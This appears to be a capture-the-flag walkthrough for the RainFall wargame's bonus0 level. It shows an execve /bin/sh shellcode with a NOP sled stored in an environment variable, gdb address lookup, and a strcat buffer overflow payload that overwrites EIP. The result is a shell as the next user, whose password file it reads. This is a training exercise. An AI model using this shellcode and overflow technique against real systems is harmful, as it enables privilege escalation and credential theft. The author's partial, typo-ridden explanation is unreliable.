```
bonus0@RainFall:~$ ll
total 17
dr-xr-x---+ 1 bonus0 bonus0   80 Mar  6  2016 ./
dr-x--x--x  1 root   root    340 Sep 23  2015 ../
-rw-r--r--  1 bonus0 bonus0  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus0 bonus0 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0*
-rw-r--r--+ 1 bonus0 bonus0   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus0 bonus0  675 Apr  3  2012 .profile
```

So once we have taken a look at the ASM code of the bonus0 we can see that there are two
buffers, that are in reality just one.
What does the code do ?
it takes two things as input, and then strcat's the two texts.
```
bonus0@RainFall:~$ export SC=$(python -c 'print "\x90"*10000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
```
First things first let's put the shell code in an evironment variable
then let's exploit things.
Then we need to find the adress where the SC is stored:
```
(gdb) b main
(gdb) run
(gdb) x/100s *((char **)environ)
bfffd814
```
one we have that let's make our payload.
```
bonus0@RainFall:~$ (python -c 'print "A"*20'; sleep 0.5; python -c 'print "A"*9 + "\x14\xd8\xff\xbf" "A"*2'; cat) | ./bonus0
```

okk why is that, the first 20 is to fill the first buffer, then we sleep to make the python write in the two buffers, not just the first one
then we write 9 A to fill the buffer again, in the final buffer, it would be right their that we have to renive the EIP, so we do so.
And then we pt some A, but t be honnest I don't really get why.
And good jib you have your shell

```
bonus0@RainFall:~$ (python -c 'print "A"*20'; sleep 0.5; python -c 'print "A"*9 + "\x14\xd8\xff\xbf" "A"*2'; cat) | ./bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAA�A�A AAAAAAAAA�A�A
whoami
bonus1
cd ../bonus1
ls -a
.  ..  .bash_logout  .bashrc  .pass  .profile  bonus1
cat .pass
<hidden>
```
